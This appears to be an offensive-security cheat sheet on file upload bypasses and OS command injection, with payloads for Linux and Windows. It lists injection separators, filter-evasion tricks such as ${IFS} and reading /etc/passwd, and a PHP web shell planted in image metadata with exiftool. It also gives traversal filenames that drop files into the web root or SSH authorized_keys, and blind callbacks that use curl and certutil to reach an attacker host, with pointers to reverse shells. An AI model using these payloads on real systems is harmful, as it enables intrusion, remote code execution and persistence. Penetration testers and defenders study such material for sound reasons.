# File paths, uploads, and command input

LFI / traversal: [lfi.md](lfi.md) · [rfi.md](rfi.md)

## File upload
Find the saved path/handler. Upload success ≠ execution; request the file with a harmless marker.

- Extensions: `.phtml`, `.php5`, `.pHp`, double extensions.
- Magic bytes: prefix `GIF89a;`.
- Writable Apache `.htaccess`: `AddType application/x-httpd-php .jpg`

## Command injection
Compare each payload against a baseline:

```text
; id
| id
&& id
$(id)
; sleep 5
```
- Blind: repeat `sleep 5` vs baseline, or callback.
- Space filter: `${IFS}` (shell context only).

## Upload filter bypasses
Change one thing at a time; the page may check extension, `Content-Type`, magic bytes and content separately.

| Filter | Try |
| --- | --- |
| `Content-Type` check | Keep the real file, set the part header to `Content-Type: image/jpeg` in the request |
| Extension denylist | `.phtml`, `.php5`, `.phar`, `.pHp`; IIS: `.aspx`, `.asp`, `.ashx`, `.asa`, `.cer`; Java: `.jsp`, `.jspx` |
| Extension allowlist | `shell.php.jpg`, `shell.jpg.php`, `shell.php%00.jpg` (old PHP), `shell.php.` / `shell.php::$DATA` (Windows), `shell.php;.jpg` (old IIS) |
| Image content check | Valid image + PHP in metadata: `exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg` (then needs an execution route) |
| Filename used as path | `../../shell.php` in `filename=` to land in the web root |
| Executable dir blocked | Write `.htaccess` (Apache) or `web.config` (IIS) first, then the file |

- Upload response, redirect or page source shows the saved name/path; if renamed, find the rule (hash, timestamp, user ID).
- Path traversal in the filename also reaches non-web targets: `../../../../home/<USER>/.ssh/authorized_keys` (needs correct key, mode and the file's owner) → [file-write](../linux/file-write.md#what-the-primitive-gives-you).
- 500/blank page when requested ≠ not uploaded: check interpreter, `disable_functions`, syntax.

## Windows command injection
Same baseline method; the separators differ:

```text
& whoami
&& whoami
| whoami
|| whoami
%0a whoami
; whoami            (PowerShell backend only)
```
- Blind timing: `& ping -n 6 127.0.0.1` (about 5 s); `& timeout /t 5`.
- Blind callback: `& nslookup <KALI>` / `& curl http://<KALI>:8000/probe` / `& certutil -urlcache -f http://<KALI>:8000/probe x`.
- Quote-aware: `"&whoami&"`. `cmd.exe` metacharacters need `^` to escape: `^&`.
- Linux filters: no space → `${IFS}`, `{cat,/etc/passwd}`, `cat<file`; blocked char → `$(printf '\x2f')`.
- Then a real shell: [shells](../foothold/shells.md), Windows download cradle: [file-transfer](../foothold/file-transfer.md).
